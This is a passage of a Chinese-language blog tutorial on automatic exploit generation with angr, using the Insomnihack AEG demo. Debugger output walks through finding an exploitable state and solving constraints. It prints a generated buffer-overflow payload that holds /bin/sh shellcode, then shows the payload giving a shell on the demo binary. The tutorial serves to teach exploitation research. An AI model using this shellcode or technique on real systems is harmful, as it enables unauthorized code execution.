+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ipdb<span style="color:#f92672">&gt;</span> l                                                        
+     <span style="color:#ae81ff">66</span>     exploitable_state <span style="color:#f92672">=</span> None
+     <span style="color:#ae81ff">67</span>     <span style="color:#66d9ef">while</span> exploitable_state <span style="color:#f92672">is</span> None:
+     <span style="color:#ae81ff">68</span>         <span style="color:#66d9ef">print</span>(sm)
+     <span style="color:#ae81ff">69</span>         sm<span style="color:#f92672">.</span>step()
+     <span style="color:#ae81ff">70</span>         <span style="color:#66d9ef">if</span> len(sm<span style="color:#f92672">.</span>unconstrained) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>:
+<span style="color:#ae81ff">6</span><span style="color:#f92672">--&gt;</span> <span style="color:#ae81ff">71</span>             l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found some unconstrained states, checking exploitability&#34;</span>)
+     <span style="color:#ae81ff">72</span>             <span style="color:#66d9ef">for</span> u <span style="color:#f92672">in</span> sm<span style="color:#f92672">.</span>unconstrained:
+<span style="color:#ae81ff">3</span>    <span style="color:#ae81ff">73</span>                 <span style="color:#66d9ef">if</span> fully_symbolic(u, u<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>pc):
+     <span style="color:#ae81ff">74</span>                     exploitable_state <span style="color:#f92672">=</span> u
+     <span style="color:#ae81ff">75</span>                     <span style="color:#66d9ef">break</span>
+     <span style="color:#ae81ff">76</span> 
+
+ipdb<span style="color:#f92672">&gt;</span> sm<span style="color:#f92672">.</span>unconstrained                                      
+[<span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#f92672">&lt;</span>BV32 <span style="color:#ae81ff">0x800</span> <span style="color:#f92672">..</span> packet_0_stdin_81_1024[<span style="color:#ae81ff">759</span>:<span style="color:#ae81ff">752</span>] <span style="color:#f92672">..</span> packet_0_stdin_81_1024[<span style="color:#ae81ff">767</span>:<span style="color:#ae81ff">760</span>]<span style="color:#f92672">&gt;&gt;</span>]
+</code></pre></div><p>步进 <code>fully_symbolic</code> 函数，</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>angr<span style="color:#f92672">/</span>angr<span style="color:#f92672">-</span>doc<span style="color:#f92672">/</span>examples<span style="color:#f92672">/</span>insomnihack_aeg<span style="color:#f92672">/</span>solve<span style="color:#f92672">.</span>py(<span style="color:#ae81ff">20</span>)fully_symbolic()
+     <span style="color:#ae81ff">18</span>     <span style="color:#e6db74">&#39;&#39;&#39;
+</span><span style="color:#e6db74">     19 
+</span><span style="color:#e6db74">---&gt; 20     for i in range(state.arch.bits):
+</span><span style="color:#e6db74">     21         if not state.solver.symbolic(variable[i]):
+</span><span style="color:#e6db74">     22             return False
+</span><span style="color:#e6db74">ipdb&gt; variable                                  
+</span><span style="color:#e6db74">&lt;BV32 0x800 .. packet_0_stdin_81_1024[759:752] .. packet_0_stdin_81_1024[767:760]&gt;
+</span></code></pre></div><p>到达可利用的状态，输出查看，<code>BV32 Reverse(packet_0_stdin_81_1024[767:736])</code> 为 eip 的值，完全符号化。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">     <span style="color:#ae81ff">80</span>     l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found a state which looks exploitable&#34;</span>)
+<span style="color:#ae81ff">4</span>    <span style="color:#ae81ff">81</span>     ep <span style="color:#f92672">=</span> exploitable_state
+     <span style="color:#ae81ff">82</span> 
+<span style="color:#f92672">---&gt;</span> <span style="color:#ae81ff">83</span>     <span style="color:#66d9ef">assert</span> ep<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>symbolic(ep<span style="color:#f92672">.</span>regs<span style="color:#f92672">.</span>pc), <span style="color:#e6db74">&#34;PC must be symbolic at this point&#34;</span>
+     <span style="color:#ae81ff">84</span> 
+     <span style="color:#ae81ff">85</span>     l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;attempting to create exploit based off state&#34;</span>)
+     <span style="color:#ae81ff">86</span> 
+     <span style="color:#ae81ff">87</span>     <span style="color:#75715e"># keep checking if buffers can hold our shellcode</span>
+     <span style="color:#ae81ff">88</span>     <span style="color:#66d9ef">for</span> buf_addr <span style="color:#f92672">in</span> find_symbolic_buffer(ep, len(shellcode)):
+
+ipdb<span style="color:#f92672">&gt;</span> ep                     
+<span style="color:#f92672">&lt;</span>SimState <span style="color:#960050;background-color:#1e0010">@</span> <span style="color:#f92672">&lt;</span>BV32 Reverse(packet_0_stdin_81_1024[<span style="color:#ae81ff">767</span>:<span style="color:#ae81ff">736</span>])<span style="color:#f92672">&gt;&gt;</span>
+</code></pre></div><p>接下来，获得 <code>symbolic buffer,</code> 访问 memory，设定利用约束</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">&gt;</span> <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>angr<span style="color:#f92672">/</span>angr<span style="color:#f92672">-</span>doc<span style="color:#f92672">/</span>examples<span style="color:#f92672">/</span>insomnihack_aeg<span style="color:#f92672">/</span>solve<span style="color:#f92672">.</span>py(<span style="color:#ae81ff">91</span>)main()
+     <span style="color:#ae81ff">89</span>         l<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;found symbolic buffer at </span><span style="color:#e6db74">%#x</span><span style="color:#e6db74">&#34;</span>, buf_addr)
+<span style="color:#ae81ff">5</span>    <span style="color:#ae81ff">90</span>         memory <span style="color:#f92672">=</span> ep<span style="color:#f92672">.</span>memory<span style="color:#f92672">.</span>load(buf_addr, len(shellcode))
+<span style="color:#f92672">---&gt;</span> <span style="color:#ae81ff">91</span>         sc_bvv <span style="color:#f92672">=</span> ep<span style="color:#f92672">.</span>solver<span style="color:#f92672">.</span>BVV(shellcode)
+     <span style="color:#ae81ff">92</span> 
+     <span style="color:#ae81ff">93</span>         <span style="color:#75715e"># check satisfiability of placing shellcode into the address</span>
+
+ipdb<span style="color:#f92672">&gt;</span> memory                                                                     
+<span style="color:#f92672">&lt;</span>BV176 packet_0_stdin_81_1024[<span style="color:#ae81ff">1023</span>:<span style="color:#ae81ff">848</span>]<span style="color:#f92672">&gt;</span>
+</code></pre></div><p>输出获得 <code>buffer</code> 地址为 <code>0x804a060</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ipdb<span style="color:#f92672">&gt;</span> hex(buf_addr)                              
+<span style="color:#e6db74">&#39;0x804a060&#39;</span>
+</code></pre></div><p>在 IDA 中查看，发现 <code>0x804A060</code> 为 <code>component_name</code> 地址。</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">.bss:<span style="color:#960050;background-color:#1e0010">0804</span><span style="color:#a6e22e">A060</span> <span style="color:#66d9ef">component_name</span>  <span style="color:#66d9ef">db</span>    <span style="color:#960050;background-color:#1e0010">?</span> <span style="color:#75715e">;               ; DATA XREF: sample_func+D↑o
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">.bss</span>:<span style="color:#ae81ff">0804</span><span style="color:#66d9ef">A060</span>                                         <span style="color:#75715e">; main+1D↑o ...
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">.bss</span>:<span style="color:#ae81ff">0804</span><span style="color:#66d9ef">A061</span>                 <span style="color:#66d9ef">db</span>    <span style="color:#960050;background-color:#1e0010">?</span> <span style="color:#75715e">;
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">.bss</span>:<span style="color:#ae81ff">0804</span><span style="color:#66d9ef">A062</span>                 <span style="color:#66d9ef">db</span>    <span style="color:#960050;background-color:#1e0010">?</span> <span style="color:#75715e">;
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">.bss</span>:<span style="color:#ae81ff">0804</span><span style="color:#66d9ef">A063</span>                 <span style="color:#66d9ef">db</span>    <span style="color:#960050;background-color:#1e0010">?</span> <span style="color:#75715e">;
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">.bss</span>:<span style="color:#ae81ff">0804</span><span style="color:#66d9ef">A064</span>                 <span style="color:#66d9ef">db</span>    <span style="color:#960050;background-color:#1e0010">?</span> <span style="color:#75715e">;
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">.bss</span>:<span style="color:#ae81ff">0804</span><span style="color:#66d9ef">A065</span>                 <span style="color:#66d9ef">db</span>    <span style="color:#960050;background-color:#1e0010">?</span> <span style="color:#75715e">;
+</span></code></pre></div><p>最后运行到约束求解。获得 <code>exploit</code> 部分，输出查看</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">ipdb<span style="color:#f92672">&gt;</span> ep<span style="color:#f92672">.</span>posix<span style="color:#f92672">.</span>dumps(<span style="color:#ae81ff">0</span>)                                                                   
+<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;jhh///sh/bin</span><span style="color:#ae81ff">\x89\xe3</span><span style="color:#e6db74">1</span><span style="color:#ae81ff">\xc9</span><span style="color:#e6db74">j</span><span style="color:#ae81ff">\x0b</span><span style="color:#e6db74">X</span><span style="color:#ae81ff">\x99\xcd\x80\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01</span><span style="color:#e6db74">`</span><span style="color:#ae81ff">\xa0\x04\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>
+</code></pre></div><p>我们可以看到生成的 exploit 内容，即 <code>shellcode+padding+shellcode_addr</code></p>
+<p>从而达到覆盖 <code>do_something</code> 函数指针为 <code>shellcode</code> 地址的目的。</p>
+<h3 id="验证-exploit">验证 exploit</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">(angr) angr<span style="color:#a6e22e">@f6839fc38468</span>:<span style="color:#f92672">~/</span>angr<span style="color:#f92672">-</span>doc<span style="color:#f92672">/</span>examples<span style="color:#f92672">/</span>insomnihack_aeg<span style="color:#960050;background-color:#1e0010">$</span> (cat <span style="color:#f92672">./</span>demo_bin<span style="color:#f92672">-</span>exploit;  echo BUMO) <span style="color:#f92672">|</span> <span style="color:#f92672">./</span>demo_bin <span style="color:#75715e"># 获得 shell 后执行命令 echo BUMO</span>
+Component Name:
+Initializing component<span style="color:#f92672">...</span>
+Copying component name<span style="color:#f92672">...</span>
+Running component<span style="color:#f92672">...</span>
+ <span style="color:#f92672">-</span> BUMO <span style="color:#75715e">#可以输出 BUMO</span>
+ <span style="color:#f92672">-</span> recieved argument <span style="color:#ae81ff">1</span>
+</code></pre></div><p>将 <code>demo_bin-exploit</code> 中的内容传给 <code>demo_bin</code> 程序即可 getshell，使用 <code>echo BUMO</code> 进行测试，发现成功进行利用。</p>
+<h2 id="总结">总结</h2>
+<p>本文章结合官方示例粗略地展示了简单 AEG 的利用过程。该用例是简单的缓冲区溢出，首先通过符号执行获得未约束状态，再通过判断指令寄存器 pc 值来确定该状态是否可利用，寄存器pc为符号值代表可以劫持控制流。获得可利用状态后，构造利用约束，判断状态的可满足性，最后进行约束求解，生成 <code>exploit</code>。</p>
+<p>如何根据漏洞类型恰当地设置路径约束/漏洞约束，探索程序 <code>crash</code>/可利用状态。并结合漏洞利用技术构造利用约束是解决此类问题的关键。</p>
+<h2 id="参考资料">参考资料</h2>
+<ol>
+<li>
+<p><a href="http://angr.io/api-doc/">http://angr.io/api-doc/</a></p>
+</li>
+<li>
+<p><a href="https://ma3k4h3d.top/2019/01/09/insomnihack-aeg/">https://ma3k4h3d.top/2019/01/09/insomnihack-aeg/</a></p>
+</li>
+<li>
+<p><a href="https://www.reddit.com/r/securityCTF/comments/8nyft5/angr_posixdumps/">https://www.reddit.com/r/securityCTF/comments/8nyft5/angr_posixdumps/</a></p>
+</li>
+</ol>
+</div>
+	
+</article></main>
+<footer class="footer">
+	<span>
+		Copyright © 2020–2020, Yuuoniy and the Hugo Authors; all rights reserved.
+		
+	</span>
+	<span>&middot;</span>
+	<span>Powered by <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>️ and <a href="https://gitlab.com/hugo-plains/hugo-plains" rel="noopener" target="_blank">Plains</a></span>
+</footer>
+<script src="https://blog.yuuoniy.cn/highlight.min.js"></script>
+<script>
+	hljs.initHighlightingOnLoad();
+</script>
+</body>
+</html>
+
